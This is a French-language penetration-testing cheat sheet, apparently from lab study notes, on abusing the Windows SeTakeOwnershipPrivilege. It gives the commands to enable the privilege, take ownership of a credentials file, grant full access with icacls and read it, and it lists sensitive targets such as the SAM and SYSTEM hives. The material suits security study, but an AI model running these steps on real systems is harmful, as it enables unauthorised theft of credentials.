# SeTakeOwnershipPrivilege

### <mark style="color:red;">**Description**</mark>

{% hint style="warning" %}
Le privilège **SeTakeOwnershipPrivilege** permet à un utilisateur de prendre la propriété de n'importe quel objet sécurisable sur le système, comme des objets Active Directory, des fichiers NTFS, des clés de registre, des services, etc. Ce privilège accorde des droits **WRITE\_OWNER** sur un objet, ce qui permet à l'utilisateur de changer le propriétaire de l'objet dans son descripteur de sécurité. Les administrateurs sont généralement affectés à ce privilège par défaut.
{% endhint %}

***

#### <mark style="color:green;">**Commandes et Utilisation**</mark>

**Vérification des Privilèges de l'Utilisateur**

```bash
whoami /priv
```

```
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
```

***

<mark style="color:green;">**Activation du Privilège SeTakeOwnershipPrivilege**</mark>

1. **Importer le module d'activation** :

```bash
Import-Module .\Enable-Privilege.ps1
```

2. **Activer tous les privilèges** :

```bash
.\EnableAllTokenPrivs.ps1
```

3. **Vérification de l'activation** :

```bash
whoami /priv
```

***

<mark style="color:green;">**Prendre la Propriété du Fichier**</mark>

```bash
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

***

<mark style="color:green;">**Vérification de la Propriété Après Modification**</mark>

```bash
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

***

<mark style="color:green;">**Modification de l'ACL (Liste de Contrôle d'Accès)**</mark>

Si vous n'avez toujours pas l'accès complet au fichier, modifiez les ACL pour obtenir l'accès en lecture :

```bash
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

***

<mark style="color:green;">**Lecture du Fichier**</mark>

```bash
cat 'C:\Department Shares\Private\IT\cred.txt'
```

***

#### <mark style="color:green;">**Exemples de Fichiers Ciblés**</mark>

* **c:\inetpub\wwwwroot\web.config**
* **%WINDIR%\repair\sam**
* **%WINDIR%\repair\system**
* **%WINDIR%\repair\software**
* **%WINDIR%\system32\config\SecEvent.Evt**

***
